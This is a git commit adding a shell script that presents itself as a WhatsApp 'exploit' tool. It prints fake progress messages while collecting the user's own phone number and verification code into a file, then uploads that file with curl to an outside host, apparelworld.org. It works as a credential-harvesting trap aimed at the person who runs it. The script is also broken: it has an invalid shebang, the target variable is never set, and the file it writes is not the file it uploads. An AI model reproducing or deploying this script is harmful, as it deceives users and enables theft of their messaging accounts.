4499ae4249a6003da79fdf22adb5c01ba9837eb2
MRDRTM <89577107+MRDRTM@users.noreply.github.com>
2021-08-27 13:38:09 +0700

    Add files via upload

---
+++ fail0.sh
@@ -0,0 +1,41 @@
+#!/belajar/IT/
+
+echo"
+
+<-- MR•DR -->
+#########################
+# whatsapp Code # By./MR•DR
+# Exsploiter # By./@Ilmu/IT/Tutorial/
+#########################
+<Bismillah>
+echo "";
+read -p "Nomer Kamu (+62xxxx) => " nomer;
+read -p "Nomer Target (+62xxxx) => " nomer;
+sleep 2
+echo "[ + ] Syncing Target... ";
+sleep 1
+echo "Logine => $nomer";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "Exploiting...";
+echo "Nomer => $nomer" >> kontrol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5;
+echo "[ + ] Done.";
+echo "Verify Code => " code;
+sleep 2
+echo "[ + ] Connecting to whatsapp.com...";
+echo "Login => $nomer.";
+sleep 0.5
+echo "Code=> $code";
+sleep 0.5
+echo "Sending Exploit...";
+echo "Code => $code" >> kontrol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5
+echo "Success Exsploited!";
+sleep 5
+echo "[ + ] Open Whatsapp.com";
+exit;
+t;
